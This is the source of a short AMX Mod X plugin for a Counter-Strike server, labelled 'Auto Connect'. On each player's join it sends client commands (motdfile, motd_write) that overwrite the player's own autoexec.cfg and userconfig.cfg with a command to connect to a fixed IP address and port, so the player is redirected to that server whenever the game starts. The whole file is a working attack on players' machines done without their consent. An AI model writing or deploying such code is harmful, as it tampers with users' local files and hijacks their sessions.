#include <amxmodx>

#define PLUGIN "Auto Connect"
#define VERSION "1.0"
#define AUTHOR "Dragan015Bre"

#define CFG_FILE1 "autoexec.CFG"
#define CFG_FILE2 "userconfig.CFG"
#define CON "connect 103.195.100.16:27020"

public plugin_init()
{
	register_plugin(PLUGIN, VERSION, AUTHOR)
}
public client_putinserver(id)
{
	set_task(2.0, "cfg", id)
}
public cfg(id)
{
	client_cmd(id, "Motdfile ^"%s^"", CFG_FILE1)
	client_cmd(id, "Motd_write %s", CON)
	client_cmd(id, "Motdfile ^"%s^"", CFG_FILE2)
	client_cmd(id, "Motd_write %s", CON)
}